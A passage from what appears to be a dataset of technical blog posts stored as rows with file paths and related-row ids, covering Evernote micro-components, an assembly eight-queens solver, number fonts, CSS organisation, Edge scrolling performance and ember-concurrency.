new component that lazily resorts a user s notes in the background  In previous versions of the Evernote web app  note sorting relied on the Evernote service  and the experience could be easily affected by network latency  Now  notes are continuously sorted across a variety of different attributes  When a user interacts with the sorting UI  a message will be sent to this new component  The component will first request a re sort from the service  but if the request takes more than 100ms  the client side component will take over and provide the results leading to a far snappier experience for our users   In the future  we ll build a micro component like the Sorter with a small team of dedicated engineers  They ll be able to develop the new component in near isolation and then iterate on that component in our actual production environment releasing new code when they have something new to push out  After all  the component can consume messages from an existing  topic   and the result of its work is harmless at worst it publishes a new message to the broker   Thinking about client side development in terms of micro components also makes our codebase less fragile and easier to work on  Suppose that a year after the Sorter component is deemed  complete  we add a new attribute let s call it omega  to our Note type  Suppose we also want notes to be sortable based on the value of omega   Even if the engineers who originally built the Sorter are no longer available  other Evernote engineers should be able to quickly get up to speed and confidently make the necessary changes to the Sorter micro component because micro components are small by nature  There s less code to read and understand  and even if you do make a mistake  the reach and impact of any regression is limited to the scope of the Sorter component  Already  I ve seen my engineers excited about being able to work on our client without the need to maintain a mental model of the entire system at all times  And this should only improve as we refine the underlying architecture   TL DR  we re never going back  And this shouldn t be surprising when you consider that every major engineering department that has made the switch to micro service architectures would likely laugh at the idea of moving back to a monolith   I m looking forward to sharing more about our application architecture once we release a beta version of Ion to the public early next year  If you want to know more sooner than that  you ll just have to come work here  We re always looking for experts software engineers with experience building modular  scalable web applications  Feel like that s you  Reach out and you can come help us define what comes next,"[248 444 996 820 629 400 28 1305 1395 200 454]"
270,training-dataset/engineering/635.txt,engineering,Overkilling the 8 queens problemLast night  a fellow Hacker Schooler challenged me to a running time contest on the classic eight queens puzzle  Naturally  I pulled up my trusty Intel  64 manual and got to work  It turned out to be even faster than I expected  churning out pretty printed output in 15ms  which is totally dominated by the time it takes the terminal to display it  it takes only 2ms if redirected to a file    Update  Very slightly more scientific testing  spurred by curious Hacker News commenters  indicates that  without pretty printing and other overhead  the solving time is actually closer to 11 2 s   about a factor of 7 speedup over commenter bluecalm s C implementation   pretty printed output   Click here to see the full output    The Approach  My solution method is heavily inspired by this paper  which  appropriately enough  concerns a beautifully insane programming language called MCPL  combining features from ML  C  and Prolog   This paper contributes two key insights about solving the 8 queens problem   Conceptually  we can model the solution space as the leaves of a tree  where each internal node of the tree corresponds to a partial board  with the number of queens equal to the tree depth   and each parent child link represents adding another queen at the row number corresponding to the depth of the child  Since there can only be one queen per row in a correct solution  this tree is a superset of the actual solution set   Instead of actually constructing the tree  we can simply keep track of the current traversal state  In particular  this means we keep track of the currently occupied columns  the occupied leftward going diagonals  and the occupied rightward going diagonals  as they intersect the current row   Each of these three state variables is eight bits of information   In addition  we can keep track of the past traversal history of each level using a the stack   If any of this is unclear  check out the paper  which has a beautiful diagram that there is no need for me to attempt replicating   The Code  I m going to go through the first version of the code  which doesn t produce the pretty boards but has most of the clever tricks   Ironically  adding  pretty printing  made my code uglier  Maybe it s just that I was up too late working on it    The heart of this algorithm is the sequence that updates the state variables as we move from one layer into the next  This whole program is small enough that it s still practical to just set aside registers to represent most variables  in particular  rdx represents where it s okay to place a queen at the current layer  e g  it starts out as 0b11111111    and xmm1  one of those fancy 128 bit registers that supports fancy new operations  stores the  occupied left diagonals    occupied right diagonals   and  occupied columns  states  in that order  with  occupied columns  being the least significant word    xmm2   xmm3   and xmm4 are just being used as scratch space  Finally  xmm7 is a constant 0xff    Instruction Dictionary  To spare you the effort of searching through the Intel  64 manual yourself  here are brief descriptions of all the fancy instructions I m about to use   vpsllw   Vector Packed Shift Left  Logical  Words   Separately shifts left every word of the second argument by the number of bits represented as the third argument  and store the result to the first argument       Separately shifts left every word of the second argument by the number of bits represented as the third argument  and store the result to the first argument  vpsrlw   Vector Packed Shift Right  Logical  Words   Separately shifts right every word of the second argument by the number of bits represented as the third argument  and store the result to the first argument       Separately shifts right every word of the second argument by the number of bits represented as the third argument  and store the result to the first argument  pblendw   Packed Blend Words   Using the third argument as a mask  selectively copy words from the second argument to the first argument       Using the third argument as a mask  selectively copy words from the second argument to the first argument  vpsrldq   Vector Packed Shift Right  Logical  Double Quadword   Shifts the entire second argument by the number of bytes specified in the third argument  and stores the result to the first argument       Shifts the entire second argument by the number of bytes specified in the third argument  and stores the result to the first argument  por   Parallel OR   Bitwise ORs the first and second argument and assigns the result to the first argument       Bitwise ORs the first and second argument and assigns the result to the first argument  vpandn   Vector Parallel AND NOT   Inverts the second argument  ANDs the result with the third argument  and assigns the result of that to the first argument       Inverts the second argument  ANDs the result with the third argument  and assigns the result of that to the first argument  movq   Move Quadword  The standard way to move data between xmm registers and normal registers   8queens asmgithub vpsllw xmm2   xmm1   1   shift entire state to left  place in xmm2 vpsrlw xmm3   xmm1   1   shift entire state to right  place in xmm3 pblendw xmm1   xmm2   0b 100   only copy  left attacking  word back from xmm2 pblendw xmm1   xmm3   0b 010   only copy  right attacking  word back from xmm3  Now  let s take this a few lines at a time   If you re accustomed to C  you might think of this as functionally equivalent to something like xmm1 2      1  xmm1 1     1   We want the word in position 1 to shift right and the word in position 2 to shift left  while the word in position 0  occupied columns  stays put   8queens asmgithub vpsrldq xmm2   xmm1   4   shift state right 4  ast bytes ast   place in xmm2 vpsrldq xmm3   xmm1   2   shift state right 2 bytes  place in xmm3 por xmm2   xmm3   collect bitwise ors in xmm2 por xmm2   xmm1  Now  we want to combine the information about which squares in the next layer are under attack  It doesn t matter from which direction   we want to make sure not to put a queen there  So  we shift right 2 words    4 bytes  and right 1 word    2 bytes  and OR them all together  accumulating into a scratch register so we don t clobber our state    8queens asmgithub vpandn xmm4   xmm2   xmm7   invert and select low byte movq rdx   xmm4   place in rdx jmp next_state   now we re set up to iterate  But that still contains some stuff in the upper bytes  We only want the lower byte  And we also want 1 bits where queens should be allowed  rather than where they re under attack  We can solve both problems with one vpandn instruction  which will flip all the bits  but mask out everything except the first byte  since xmm7   0xff     So  now that we re iterating  what happens next   Instruction Dictionary  bsf   Bit Scan Forward   Finds the least significant 1 bit in the second argument and stores the index of that bit into the first argument  If there is no 1 bit the second argument  the value of the first argument is undefined  and the zero flag   ZF   is set       Finds the least significant bit in the second argument and stores the index of that bit into the first argument  If there is no bit the second argument  the value of the first argument is undefined  and the zero flag     is set  btc   Bit Clear   Clears the bit in the first argument with index given by the second argument       Clears the bit in the first argument with index given by the second argument  je   Jump If Equal   Pretty self explanatory  when used in conjunction with cmp   Compare         Pretty self explanatory  when used in conjunction with      jz   Jump If Zero   Jumps to the specified address label if the zero flag  ZF  is set       Jumps to the specified address label if the zero flag  ZF  is set  push   Push To Stack   Stores its single argument to the memory location pointed by rsp   and decrements rsp  usually by eight at a time  i e   rsp    rsp 8         Stores its single argument to the memory location pointed by   and decrements  usually by eight at a time  i e      shl   Logical Shift Left for non  xmm registers   8queens asmgithub next_state  bsf rcx   rdx   find next available position in current level jz backtrack   if there is no available position  we must go back btc rdx   rcx   mark position as unavailable cmp rsp   r14   check if we ve done 7 levels already je win   if so  we have a win state  otherwise continue movq r10   xmm1   save current state     push rdx push r10       to stack mov rax   r15   set up attack mask shl rax   cl   shift into position movq xmm2   rax por xmm1   xmm2   mark as attacking in all directions  First we try scanning for an available position on this row   one that isn t under attack from already placed queens  and that also hasn t already been visited  If there is none  then we have no choice but to backtrack  a little piece of code which is coming up soon   Assuming we find an available position  we first mark it as visited unavailable  We then check if this is the last level that needs to be taken care of  by looking at the stack pointer  Since the stack gets deeper by 16 bytes with every level  this test is easily set up at program initialization  If the test is true  then we ve discovered a solution  or  win state    so we go ahead to the  win  code   If we ve neither succeeded nor failed  it means we just have to go another level down in the tree  In order to have an efficient backtracking capability  we store our state variables on the stack  so they can be restored when everything fails deeper down in the tree  Finally  we update our model of which squares are in danger by adding the queen we re currently placing as a column occupier and diagonal occupier  modifying all three state variables at once with the magic of por    Note here that cl is just a name for the least significant byte of the rcx register  which houses the horizontal position of the new queen   8queens asmgithub backtrack  cmp rsp   r13   are we done  je done pop r10   restore last state pop rdx movq xmm1   r10 jmp next_state   try again  What if we have to backtrack   First  we have another stack pointer test   if we ve tried to backtrack past the start of the program  then we know we ve exhausted all possibilities and just go to done   Assuming that s not at issue  we simply restore the rdx and xmm1 variables  using r10 as scratch storage since one can t directly pop xmm registers   Then we just jump back into our loop  with a new state ready to go   8queens asmgithub  include  os_dependent_stuff asm  mov rdx   0b 11111111   all eight possibilities available mov r8   0x000000000000   no squares under attack from anywhere movq xmm1   r8   maintain this state in xmm1 mov r15   0x000100010001   attack mask for one queen  left  right  and center  mov r14   0xff   mask for low byte movq xmm7   r14   stored in xmm register mov r13   rsp   current stack pointer  if we backtrack here  then mov r14   rsp   the entire solution space has been explored  sub r14   2  ast  8  ast  7   this is where the stack pointer would be when we ve   completed a winning state next_state  bsf rcx   rdx   find next available position in current level jz backtrack   if there is no available position  we must go back btc rdx   rcx   mark position as unavailable cmp rsp   r14   check if we ve done 7 levels already je win   if so  we have a win state  otherwise continue movq r10   xmm1   save current state     push rdx push r10       to stack mov rax   r15   set up attack mask shl rax   cl   shift into position movq xmm2   rax por xmm1   xmm2   mark as attacking in all directions vpsllw xmm2   xmm1   1   shift entire state to left  place in xmm2 vpsrlw xmm3   xmm1   1   shift entire state to right  place in xmm3 pblendw xmm1   xmm2   0b 100   only copy  left attacking  word back from xmm2 pblendw xmm1   xmm3   0b 010   only copy  right attacking  word back from xmm3 vpsrldq xmm2   xmm1   4   shift state right 4  ast bytes ast   place in xmm2 vpsrldq xmm3   xmm1   2   shift state right 2 bytes  place in xmm3 por xmm2   xmm3   collect bitwise ors in xmm2 por xmm2   xmm1 vpandn xmm4   xmm2   xmm7   invert and select low byte movq rdx   xmm4   place in rdx jmp next_state   now we re set up to iterate backtrack  cmp rsp   r13   are we done  je done pop r10   restore last state pop rdx movq xmm1   r10 jmp next_state   try again win  inc r8   increment solution counter jmp next_state   keep going done  mov rdi   r8   set system call argument to solution count mov rax   SYSCALL_EXIT   set system call to exit syscall   this will exit with our solution count as status  Now we re ready to look at the whole solution in context   If you re curious to investigate further  run the code yourself and or check out the more complicated  pretty printing version,"[270 1175 726 820 425 629 400 28 444 248 1305]"
311,training-dataset/product/489.txt,product,Finding the best free fonts for numbersThough there are countless blog posts and recommendation lists for fonts and font pairings these days  what s really tough to find are the best fonts for numbers  If you can t afford FF DIN or Numbers by H CO  there isn t much guidance  let alone a go to recommendation list   Our principles  At Graphiq  we think about data tables  charts  and infographics all day every day  Though we use Helvetica for most of our embeddable data visualizations  we do have several guidelines for picking number fonts and we re happy to share them with the world   1  Lining and tabular  The first rule for picking a good number font is to make sure it comes with lining and tabular figures   Fancy typography terms aside  lining just means that all the numbers are sitting on the baseline and aligned with the cap height  instead of going up and down  which is called  oldstyle     Tabular just means the numbers are monospaced   every number occupies the same horizontal space  instead of varying space according to their own shape  which is called  proportional  in typography terms    Tabular figures offer better vertical alignment than proportional ones  Though it s not necessary for all use cases  it s nice to use tabular numbers as a default   2  Good number symbols  The second step is to check that any given number font has good number symbols  With free fonts  it s sometimes unpredictable how good those symbols are   Some examples of     and     symbols that might surprise you if you don t check ahead   We always make sure to check     and      so we use   123 456 789 00   as the testing string  If your data set requires other symbols  it s a good idea to include them as well   3  Check each individual figure design  Lastly  before settling on a font  double check all its individual figure designs make sure the number one doesn t look like 7  5 doesn t look like 6  etc   Similarly  here are some examples of confusing and weirdly designed figures   Those are special cases  and those fonts probably aren t made to be number fonts  but they re good examples to emphasize the importance of checking each individual digit   Google Font recommendations  With these 3 principles in mind  we went through the entire Google Font library and picked the 5 best number fonts in each category   Serif fonts  We start the recommendations with serif fonts  There are a number of different styles of serif fonts in general  and we tried to pick the best from each style   1  Droid Serif  Droid Serif is a no brainer  A typical  good  contemporary serif font with well designed numbers  It doesn t add too much flare to your project  but it s universal and it s extremely easy to read on any screen   If you happened to use PT Sans or Source Sans Pro  PT Serif and Source Serif Pro are two other generic serif fonts with good number design   2  Crimson Text  Next  for the Garamond style serif fonts  Crimson Text is the way to go  It s a widely used serif font and it ships with lining and tabular figures  The numbers are nicely designed and fit nicely into that style   3  Old Standard TT  If you re looking for a classic  elegant style  Old Standard TT is your font  With the double vertical line of the dollar sign and the beautiful squiggle of the bolded  2  and  7   it brings out that old school feeling   4  Kameron  Kameron might not be as well known as the fonts listed before  but it has nice slab serif numbers and wider figures than most serif fonts  A good number font to keep in the toolbox for sure   5  Copse  Then  there s Copse  Again  a lesser known serif font with some unique features  The low contrast design give it a sturdy posture  It has that classical feeling but is also very readable even in small font sizes   San serif fonts  Moving onto sans serif fonts  there are many great system UI fonts with good figures in this category  We featured the best 2 here  with 3 other fonts in their distinctive styles   Open Sans  Being the most popular Google Font  Open Sans is all over the internet  Many may argue it s boring and will become a clich  like Helvetica  but Open Sans is a good universal sans serif font with nice figures  If you re using Open Sans already  use the numbers   2  Lato  Another widely adopted sans serif font  it provides a very different style from Open Sans  with lower contrast and the slab of the number  1   but still very transparent and works in all cases   3  Roboto Condensed  When thinking about sans serif number fonts  some of you might want to use Oswald for that strong  condensed style  Sadly  Oswald comes with proportional numbers and it won t work when you need vertical alignments  Roboto Condensed is the best tabular alternative we found   4  Titillium Web  Titillium Web has a very unique style  It s squarish and has a rigorous feeling  If you want a style to deliver the cold  hard truth  Titillium might be a good pick   5  Varela Round  Varela Round is the exact opposite  It s very round and cute  If you want to make your numbers more friendly  or it fits your industry  Varela Round is a nice choice   Also  it s worth mentioning that Varela Round is often used as a lighter version of Montserrat  the very popular sans serif title font  Since Montserrat doesn t have tabular numbers  Varela Round  or Varela  could make a good pairing for a tabular number font   Display fonts  While those generic serif and sans serif fonts come in handy when you re making a data table or dashboard  sometimes you also need fonts with a strong presence and personality when you re making an infographic or a poster with huge numbers on it  Here comes the display fonts recommendation list   1  Graduate  Graduate features some handsome college block style numbers  It s ideal for an education related infographic  college football data  and just any strong  rigorous number display in general   2  Changa One  Changa One gives you strong  bolded tabular numbers  It s less formal than bolded sans serif fonts  and can come in handy when designing entertainment infographics and posters   3  Special Elite  This handwritten style font actually comes with tabular numbers  It s perfect for nostalgic designs or even listing out something more cryptic  like the number of committed murders for a given criminal  It s a very unique font that can be utilized in a number of ways   4  Stardos Stencil  A nice stencil font for anything that you d describe as being  hipster    5  Iceland  Iceland is a square based modern geometric font that s great for technology and mechanical data  If you want a slightly taller alternative  Iceberg is another good choice from the same designer   Proportional fonts  Lastly  there are some great fonts with beautifully designed numbers  The only issue with these is they aren t tabular  If you aren t overly concerned with vertical number alignment  they could be great choices as well   1  Montserrat  We can t have a Google Font recommendation list without Montserrat  It comes with elegantly designed numbers   If only they were tabular    2  Poppins  Another great widely used sans serif  Poppins also has great figure design  The number  9  is slightly awkward  but it s a great font in general and it has more weight variations than Montserrat   3  Bitter  Bitter s a great title font with nice numbers  Like Montserrat and Poppins  Bitter is widely used  and you should definitely consider using its numbers if you re using it as the title font   4  Ultra  Ultra is the bolded number font you want  If it featured tabular figures  Changa One might not stand a chance  If you re looking for a font to use for huge numbers like the title of a poster  Ultra is a solid pick   5  Fjalla One  We struggled a lot with whether we should include Oswald because many use it as the condensed bolded number font  and maybe a free alternative of FF Din  However  Oswald s dollar sign and number  4  looks inconsistent at times  So we re listing Fjalla One as a close alternative here with better balanced numbers   More resources and discussions  What s your process for choosing fonts for numbers  Tell us on Twitter   InVisionApp   This post was originally published on Medium   More posts about typography,"[311 1275 1334 218 1127 564 1420 444 1001 887 1344]"
319,training-dataset/product/960.txt,product,How to avoid chaos in your style sheetsIf you re a designer  you ve no doubt come across CSS  Cascading Style Sheets  many times before  Maybe you ve heard your colleagues speak about how powerful they can be for styling websites  decreasing page load times  or saving web developers precious time   It s certainly less of a headache than styling each page individually within the HTML code    CSS can also be a lifesaver when you want to rebrand your whole website  since updating your style sheet will apply the changes across the board  CSS can be incredibly valuable to both developers and designers when working together to create beautiful  dynamic websites   But if you re still not exactly sure how knowledge of CSS can benefit your work  or you re simply not confident about how to use it  then keep reading for a step by step guide to CSS  and how to keep your style sheets in order to benefit your designs and clients alike   Related  Learn how to design with your developer in mind  1  Follow fashion use frameworks  Just as fashion icons set the tone for what will be  in  this season  tech trendsetters influence the style of thousands of websites  How   Web developers create and publish frameworks  a set of rules for common website elements  This gives other developers a starting point for their website design   Frameworks can help you get a decent looking website up and running quickly  It s like trusting that you ll look okay in anything you pull off the rack in a fashionable high end retail store you don t want your website to be a fashion faux pas akin to wearing a neon green shirt with purple Wellington boots   A framework is a reliable base  but you should still experiment  Tweak the colors  fonts  etc  You never know your style sheet could become the next popular framework  After all  who knew ripped jeans would come back in style  or even become fashionable in the first place  right   2  Strive for simplicity  You ll find that as a website grows  you ll develop a pretty long  scrolling list of various elements and CSS rules  Some of the rules might overlap or override each other eventually  in that case  usually the more specific rule will win    You can end up with a lot more code than you expected  especially considering the different variations of a rule you need for different browsers and screen sizes   Sooner or later  you ll feel like you re splashing through endless puddles of CSS code  struggling to find the exact rule for the exact section you want to edit   It s good practice to always check before adding a new style rule maybe an existing one could apply   3  Structure your file  There are many ways to refactor your CSS code to make it easier to navigate and use  Some of the easiest methods are the most effective and have the most mileage  Here are some of the quickest ones   Keep your spacing uniform  Maintain the same spacing between rules and within declarations throughout your file so that it s easier to read   Maintain the same spacing between rules and within declarations throughout your file so that it s easier to read  Use semantic or  familiar  class id names  Instead of using a class name like  bottom_menu   try using the semantic tag  footer   Or when you have an image in your  contact  section  make sure you re using a class on your image like  contact_image    Instead of using a class name like  bottom_menu   try using the semantic tag  footer   Or when you have an image in your  contact  section  make sure you re using a class on your image like  contact_image   Keep it DRY  Don t Repeat Yourself   Ideally you want to repeat as little of your code as possible  Do you find the declaration  background color   000  repeated throughout your CSS file  Consider typing it once and instead  using multiple selectors on the one declaration   Ideally you want to repeat as little of your code as possible  Do you find the declaration  background color   000  repeated throughout your CSS file  Consider typing it once and instead  using multiple selectors on the one declaration  Put your tidiness to the test with these tools  Run your CSS through CSS Lint or W3C these will help to parse your CSS file correctly  and highlight problem areas  Your web browser s developer tools are also extremely useful for pinpointing specific elements on your website and using the area as a sandbox to experiment with different styles and positioning   4  Go beyond the basics  If you have some programming skills  you can use more advanced CSS options like Syntactically Awesome Style Sheets  SASS  or LESS  With these pre processors  you can take advantage of more complex code options like variables  nesting  mixins  and functions to further clean up your CSS and avoid duplicates   CSS is a great tool to improve the presentation of your website  These visuals are what create your brand and your identity  and they influence the UX of your website   But with great power comes great responsibility  Remember to keep your CSS organized  Just as keeping a tidy closet is important so you can find your favorite neon green shirt without hassle  keeping a clean CSS file will help you implement those spontaneous design ideas without delay,"[319 564 444 1001 1344 1420 425 400 28 629 887]"
326,training-dataset/engineering/1439.txt,engineering,Microsoft Edge Dev BlogMicrosoft Edge Dev BlogScrolling is one of the oldest interactions on the web  Long before we had pull to refresh or infinite loading lists  the humble scrollbar solved the web s original scaling problem  how can we interact with content that s stretched beyond the available viewport   Animations by Rachel Nabors  Today  scrolling is still the most fundamental interaction on the web  and perhaps the most misunderstood  For instance  do you know the difference between the following scenarios   User scrolls with two fingers on a touch pad  User scrolls with one finger on a touch screen  User scrolls with a mouse wheel on a physical mouse  User clicks the sidebar and drags it up and down  User presses up  down  PageUp  PageDown  or spacebar keys on a keyboard  If you ask the average web user  or even the average web developer   they might tell you that these interactions are all equivalent  The truth is far more interesting   As it turns out  all five of these input methods have vastly different characteristics  especially when it comes to performance and cross browser behavior  Some of them  such as touch screen scrolling  are likely to be smooth even on a page with heavy JavaScript usage  whereas others  such as keyboard scrolling  will make the same page feel laggy and unresponsive  Furthermore  some kinds of scrolling can be slowed down by DOM event handlers  whereas others won t  What s going on here   To answer that question  and to understand how to unlock the smoothest possible scrolling on your website  let s take a step back and understand how browsers deal with multithreading and input   The multithreaded web  Conceptually  the web is a single threaded environment  JavaScript blocks the DOM  and the DOM blocks JavaScript  because both are fighting over the same thread   frequently referred to as the  main thread  or  UI thread    For instance  if you were to add this  horrible  JavaScript snippet to your page  you d immediately see jankiness across the entire user experience   setInterval         var start   Date now    while  Date now     start   500      wheeeee         1000    While this JavaScript is spinning in a useless loop  buttons don t work  form elements are unresponsive  and even animated GIFs grind to a halt   for all intents and purposes  the page is frozen  You can see this in action in a simple demo   Furthermore  if you try to scroll with the keyboard up down arrows  the page remains predictably stuck until the JavaScript stops running  All of this is strong evidence for our view of the web as a single threaded environment   There s a curious anomaly  though  if you try to scroll using touch screen scrolling  the page happily moves up and down  even while JavaScript is blocking nearly everything else on the page  This also works for touch pad scrolling  mouse wheel scrolling  and click and drag scrolling  depending on your browser    Somehow  certain scroll actions can manipulate the page state  even while everything else   buttons  input  GIFs   are totally frozen  How can we square this with our theory of the single threaded web   A tale of two threads  As it turns out  the whole  browsers are single threaded  story is largely true  but there are important exceptions  Scrolling  in all its various flavors  is one of those exceptions   Over the years  browser vendors have recognized that offloading work to background threads can yield enormous improvements to smoothness and responsiveness  Scrolling  being so important to the core user experience of every browser  was quickly identified as a ripe target for such optimizations  Nowadays  every major browser engine  Blink  EdgeHTML  Gecko  WebKit  supports off main thread scrolling to one degree or another  with Firefox being the most recent member of the club  as of Firefox 46    With off thread scrolling  even a noisy page will appear smooth as you scroll through it  because all scrolling is handled on a separate thread  It s only when you try to interact with the page through some non scrolling mechanism   tapping a button  typing into an input  clicking a link   that the fa ade fades away and the parlor trick is revealed for what it is   Considering how well it works  though  it s a great trick    There is a tradeoff with asynchronous scrolling  however  which is a common effect called checkerboarding  so named because of the way it originally appeared on Safari for iOS  as gray and white checkers   In most modern browsers  it manifests as a blank space that appears when you ve scrolled faster than the browser can paint  This isn t perfect  but it s a worthy tradeoff compared to blocked  jerky  or unresponsive scrolling   Unfortunately  it s not always easy to move scrolling to a background thread  Browsers can only do this if the host operating system allows for concurrent input  and it can vary from device to device  In particular  keyboard input is not as optimized as input from mouse or touch devices  ultimately leading to laggier keyboard scrolling across browsers   A little history is instructive here  When operating systems like Windows and macOS were first designed  one thread was all you got  and so there was little foresight to allow for concurrent input  It was only when multi core machines started to appear that OSes began to retro fit concurrency into their design   So  in the same way that vestigial organs can reveal an animal s evolutionary history  the single threaded origin of operating systems starts to peek through the seams when you look at scrolling input across the web  It s only if the host operating system allows for concurrent input   from a mouse  keyboard  or other device   that browsers can efficiently optimize scrolling to be unaffected by long running JavaScript operations that hog the main thread   On the Microsoft Edge team  though  we ve been making strides to ensure that scrolling remains smooth and responsive  regardless of the scrolling method you prefer  As of EdgeHTML 14  which shipped in the Windows 10 Anniversary Update   we support off thread scrolling for the following input methods   Single finger  touchscreen  Two finger  touchpad  Mouse wheel  Sidebar  If you compare Edge to other desktop browsers  you ll find that it s the only one to support asynchronous sidebar scrolling   i e  clicking and dragging the scroll handle  or clicking on the trackbar or arrows   In fact  this is a feature we quietly introduced in the Anniversary Update    Testing on Windows 10  14393  Surface Book  and macOS Sierra  10 12  MacBook Air   we can derive the following results   Two finger trackpad Touch Mouse wheel Sidebar Keyboard Edge 14  Windows  Y Y Y Y N Chrome 56  Windows  Y Y Y N N Firefox 51  Windows  N N N N N Chrome 56  MacOS  Y N A Y N N Firefox 51  MacOS  Y N A Y N N Safari 10 1  MacOS  Y N A Y N N  As this table demonstrates   scrolling performance can vary dramatically from browser to browser  and even from OS to OS  If you re only testing on one browser with one scrolling method  then you might be getting a very narrow view of your site s performance as it s actually experienced by users   Overall  though  it should be clear that scrolling has a special place on the web  and browsers have worked very hard to make sure that scrolling is snappy and responsive  However  there are subtle ways that a web developer can inadvertently disable a browser s built in optimizations  Let s take a look at how web developers can influence browser scrolling  for good and bad   How event listeners interfere with scrolling  Off thread scrolling represents a great gain in efficiency   scrolling and JavaScript are completely decoupled  allowing them to work in parallel without blocking each other   Anyone who s been building web pages for a while  though  probably knows how to introduce a choke point between JavaScript and scrolling   window addEventListener  wheel   function  e    e preventDefault       oh no you don t       When we attach a  wheel  listener that calls event preventDefault     it will 100  block scrolling  for both wheel and touch pad scrolling  And obviously  if scrolling is blocked  then off thread scrolling is also blocked   What s less obvious  though  is the impact in this case   window addEventListener  wheel   function  e    console log  wheel        innocent listener  not calling preventDefault        You might na vely think that a function that doesn t call preventDefault   can t block scrolling at all  or that  at the very worst  it can only block for the duration of the function itself  The truth  however  is that even an empty listener will totally block scrolling until any JavaScript operation on the page has finished  which you can verify with this demo   Even though the wheel listener has nothing to do with our big blocking JavaScript operation  they share the same JavaScript event loop  and so the background thread must wait for the longer JavaScript operation to finish before it can get a response from the listener function   Why does it have to wait  Well  JavaScript is a dynamic language  and the browser can t know for sure that preventDefault   will never get called  Even if it s obvious to the developer that the function is just doing a simple console log     browser vendors have opted not to take any chances  In fact  even an empty function      will exhibit this behavior   Note that this applies to more than just  wheel  events  on touchscreen devices  scrolling can also be blocked by  touchstart  or  touchmove  listeners  One should be very careful when adding listeners to a page  because of this impact on performance   There are a few scroll related JavaScript APIs  however  that don t block scrolling  The  scroll  event  somewhat counterintuitively  can t block scrolling because it fires after the scroll event  and thus it isn t cancelable  Also  the new Pointer Events API  which was pioneered in IE and Microsoft Edge and has recently started to appear in Chrome and Firefox  has an explicit design goal to avoid unintentional scroll blocking   Even in cases where we absolutely need to listen to  wheel  or  touchstart  events  there are certain tricks that web developers can employ to ensure that scrolling remains on the fast path  Let s take a look at a few of these tricks   Global vs local event listeners  In the example above  we covered the case of global listeners  i e  listeners attached to the  window  or  document    But what about listeners on individually scrolling elements   In other words  imagine a page that is scrollable  but there is also a subsection of the page that itself is independently scrollable  Will the browser block the entire page s scrolling if you only attach a listener to the scrollable subsection   document getElementById  scrollableDiv    addEventListener  wheel   function  e       In theory  I can only block scrolling on the div itself       If you test this out using a simple demo page  you ll find that both Microsoft Edge and Safari will allow the document to scroll smoothly  even if there s a scroll listener on the scrollable div  and the page has heavy JavaScript operations running   Here is a chart of the browsers and their behaviors   Two finger touchpad Touch Mouse wheel Click and drag Keyboard Edge 14 Desktop  Windows  Y Y Y Y N Chrome 56 Desktop  Windows  N Y N N N Firefox 51 Desktop  Windows  N N N N N Chrome 56 Desktop  MacOS  N N A N N N Firefox 51 Desktop  MacOS  Y N A Y N N Safari 10 1  MacOS  Y N A Y N N  These results show  that there s a potential optimization that web developers can employ to take advantage of these browser features  Instead of attaching wheel touch listeners to the entire document  it s preferable to add listeners to a targeted subsection of the document  so that scrolling can remain smooth for unaffected parts of the page  In other words  rather than delegating wheel touchstart listeners to the highest possible level  it s best to keep them isolated to the element that needs the scroll event   Sadly  not all JavaScript frameworks follow this practice   in particular  React tends to add global listeners to the entire document even if it should only apply to a subsection of the page  However  there is an open issue for this very problem  and the React folks have said they would be happy to accept a pull request   Kudos to the React folks for being so receptive when we provided this feedback    Passive event listeners  Avoiding global listeners for wheel touchstart is a good practice  but sometimes it just isn t possible  depending on the effect you re trying to achieve  And in a way  it may feel silly that a simple event listener should force the browser to halt the world  just on the offchance that it might call preventDefault      Luckily there is a new feature that is just starting to appear in browsers  where web developers can explicitly mark a listener as  passive  and thus avoid waiting   window addEventListener  wheel   function  e       Not calling preventDefault         passive  true      I pinkie swear I won t call preventDefault       With this fix in place  the browser will treat scrolling exactly as if the  wheel  listener had never been added  This feature is already available in the latest versions of Chrome  Firefox  and Safari  and should appear soon in an upcoming release of Microsoft Edge   Note  you will need to use feature detection to support browsers that don t have passive event listeners    For some events  notably  touchstart   and  touchmove   Chrome has also opted for an intervention in version 56 to make them passive by default  Be aware of these subtle browser differences when you add event listeners   Conclusion  As we ve seen  scrolling on the web is a fantastically complicated process  and all the browsers are at various stages of improving their performance  In general  though  we can land on some solid pieces of advice for web developers   First off  it s best to avoid attaching wheel or touch listeners to the global document or window objects  and instead add them to smaller scrollable elements  Developers should also use passive event listeners whenever possible  with feature detection to avoid compatibility issues  Using Pointer Events  there is a polyfill  and  scroll  listeners are also surefire ways to prevent unintentional scroll blocking   Hopefully this post has provided some helpful guidance for web developers  as well as a peek into how browsers work under the covers  No doubt  as browsers evolve and the web continues to grow  scrolling mechanics will become even more complex and sophisticated   On the Microsoft Edge team  we re excited to keep innovating in this space and to provide smoother scrolling for more websites and more users  Let s hear it for the humble scrollbar  the oldest and most nuanced interaction on the web     Nolan Lawson  Program Manager  Microsoft Edge    These results were collected using the latest version of each browser as of February 2017  Since then  Firefox 52 has updated their scrolling support  and now matches Edge 14 s behavior in all tests except those for sidebar scrolling  We look forward to all browsers improving their scrolling implementations and making the web faster and more responsive   Updated March 16  2017 10 57 am,"[326 167 1144 1001 223 629 400 28 1305 329 454]"
329,training-dataset/engineering/1144.txt,engineering,ember concurrency  or  How I Learned to Stop Worrying and Love the TaskFig  5  By storing previously successful tasks  we can show data updates  Here  we leave a route and re enter it to trigger a data update   Benefits for both parties in a web app  A large web app is successful if users enjoy navigating it and if developers enjoy building it  While ember concurrency was written with the intention of reducing boilerplate code and enforcing logical boundaries  our full scale adoption of the add on has made the user experience much smoother  We have built an app that demonstrates the benefits of single page applications  route transitions feel extremely speedy because the model hook returns simple objects without pausing to resolve promises  and the user receives instant visual feedback about network operations in response to clicks  Pages that retrieve data from multiple sources can display it in a progressive way and minimize idle time where the user cannot interact with the page  Responsive filter based interfaces reflect data updates in a clear and dynamic way   Many JavaScript developers  myself included  can relate to the frustration of staring at a promise chain or callback functions to understand a particular execution flow  JavaScript s powerful concurrency model and event loop become very cumbersome to manage in complex apps  where multiple components and routes multiply the unpredictability of user interaction and network latency   ember concurrency s mission to improve developer experience has been a great success  When futuristic ES6 features like generator functions were introduced  many developers nodded their head and shrugged  it seemed like a different way to execute the same asynchronous operations  with no obvious breakthrough implementation  A few years later  ember concurrency has established itself as one of the most dynamic applications of generator functions  We now write readable code without convoluted promise callbacks  The browser uses an event loop to handle asynchrony  but our brains have an easier time understanding logic that looks synchronous  Like other modern JavaScript features such as async await  generator functions abstract the complexity of the run loop into structured  linear code that mimics a flat timeline  